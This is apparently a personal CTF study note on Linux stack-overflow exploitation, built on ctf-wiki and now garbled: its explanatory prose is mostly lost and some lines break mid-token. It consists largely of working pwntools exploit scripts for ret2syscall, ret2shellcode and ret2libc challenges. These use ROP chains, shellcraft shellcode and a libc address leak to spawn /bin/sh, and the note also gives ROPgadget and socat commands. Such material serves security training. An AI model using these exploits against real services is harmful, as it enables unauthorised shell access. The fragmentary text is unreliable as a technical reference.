pwn- 
ctfwikihttps://wiki.x10sec.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/
ctfwikictfwiki
32
sudo apt-get install lib32z1 lib32ncurses5
unbuntu20lib32z1
1.  = EBPRBP -  + 48
2. callcallmv ebp+0x8
x86x64
3. 232
1n
gdbpwntools 
socatpwn
socat tcp-l:6666,fork exec:../ret2syscall,reuseaddr
6666
py
gdb.attach(p)
pause()
6666gdbgdbmain
breakgets
pypayloadgdbc
ret2syscall 
rop
https://blog.csdn.net/qq_29343201/article/details/52209588
arg1arg2……int 80
execvex864x648
1. gadget
2. pop
gadgetpop
3. gadget
4. pop
5. …………
6. int 80
ropgedget
ROPgadget --binary ret2syscall --only "pop|ret" | grep "eax"
ROPgadget --binary ret2syscall --only "int"
ROPgadget --binary ret2syscall --string "/bin/sh"
from pwn import *
host = '127.0.0.1'
port = 6666
#p = process("../ret2syscall")
p = connect(host, port)
context(log_level = "debug", arch = 'x86', os = 'linux')
#gdb.attach(p)
pause()
popeaxaddr = 0x080bb196
pop3argsaddr = 0x0806eb90
int80addr = 0x08049421
shstringaddr = 0x080be408
payload = b'A' * 0x70 + p32(popeaxaddr) +p32(0xB)+ p32(pop3argsaddr)+ p32(0) +p32(0)+p32(shstringaddr)+ p32(int80add
r)
print(payload)
p.recvuntil("What do you plan to do?")
p.sendline(payload)
p.interactive()
ret2shellcode 
returnprintshellcodeNXdisable
from pwn import *
host = '127.0.0.1'
port = 1111
#p = process("../pwn_2")
p = connect(host, port)
context(arch = 'amd64', os = 'linux')
shellcode = asm(shellcraft.sh())
p.recvline()
buffaddr = p.recvline()
buffaddr = buffaddr[14:28]
buffaddr = int(buffaddr,16)
retaddr = buffaddr + 0x18 + 0x08
payload = b'A' * 0x18 + p64(retaddr) + shellcode
p.recvuntil("Input someting : \n")
p.sendline(payload)
p.interactive()               
ret2libc 
pltgot
https://cloud.tencent.com/developer/article/1590167?from=article.detail.1680494
ctfwiki
ret2libc1
securemainsecuresystemsystem.plt
plt.data/bin/sh
ret2libc2
/bin/shgets.pltsystem.pltgets
bssbsssystem.plt
ret2libc3
libcsystem.gotsystemlibc
/bin/sh
libcGOTlibcgot
libclibcGOT
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')
ret2libc3 = ELF('./ret2libc3') //
puts_plt = ret2libc3.plt['puts'] 
//puts.pltputsputs.pltputs
libc_start_main_got = ret2libc3.got['__libc_start_main'] 
//libcstartmaingot
main = ret2libc3.symbols['main']
//main
print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
//putslibcstartmaingotputsgot
putsmainlibcstartma
in
sh.sendlineafter('Can you find it !?', payload)
print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
//p32bytesu32bytes
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
//libcsearcherlibclibcadd_condition(leaked_f
unc, leaked_address)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
//==libclibcbase
print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)
sh.interactive()
libchttps://libc.blukat.me/?q=fgets%3Ad90
infoleak
https://gloxec.github.io/2017/02/15/exploit%20without%20info%20leak/